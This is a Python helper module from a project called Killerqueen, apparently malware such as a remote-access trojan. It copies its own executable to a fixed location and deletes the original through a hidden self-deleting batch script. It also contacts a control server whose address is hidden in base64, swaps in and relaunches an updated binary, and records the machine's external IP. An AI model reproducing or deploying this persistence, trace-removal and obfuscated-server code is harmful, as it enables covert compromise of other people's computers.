# Copyright (c) 2024 Latos
#
# This file is part of Killerqueen.
#
# Source Code: https://github.com/LatosProject/
#
# This software is released under the MIT License.
# https://opensource.org/licenses/MIT

import re
import time
import requests
import os
import subprocess
import base64
import shutil
import sys
from killerqueen.config import EXE_PATH, SERVER_URL, TEMP_EXE_PATH


def copy_self():
    try:
        current_path = sys.executable
        target_dir = os.path.dirname(EXE_PATH)

        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        if os.path.abspath(current_path) != os.path.abspath(EXE_PATH):
            shutil.copy(current_path, EXE_PATH)

            temp_script = os.path.join(os.getenv("TEMP"), "temp.bat")
            script_content = f"""
            @echo off
            timeout /t 2 > nul
            del "{current_path}" > nul
            del "%~f0" > nul
            """

            with open(temp_script, "w") as f:
                f.write(script_content)

            subprocess.Popen(
                ["cmd", "/c", temp_script],
                creationflags=subprocess.CREATE_NO_WINDOW,
                close_fds=True
            )

            subprocess.Popen([EXE_PATH], close_fds=True)
            sys.exit(0)

    except Exception as e:
        print(f"An error occurred: {e}")


def get_remote_version():
    try:
        response = requests.get(f"{base64.b64decode(SERVER_URL).decode('utf-8')}/data.json", timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get("version")
    except Exception as e:
        return None


def replace_and_restart():
    bat_script = f"""
    @echo off
    timeout /t 3 >nul
    taskkill /f /im killerqueen.exe >nul 2>&1
    move /y "{TEMP_EXE_PATH}" "{EXE_PATH}" >nul
    start "" "{EXE_PATH}"
    del "%~f0"
    """
    try:
        bat_path = os.path.join(os.path.dirname(EXE_PATH), f"update_{int(time.time())}.bat")

        with open(bat_path, "w") as bat_file:
            bat_file.write(bat_script)

        subprocess.Popen([bat_path], shell=True)
    except Exception:
        return None


def get_ip_from_website():
    url = "http://api.ipify.cn"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', response.text)
        if ip_match:
            return ip_match.group(1)
        else:
            return "Failed to extract IP address"
    except requests.RequestException as e:
        return f"Failed to get external IP: {e}"
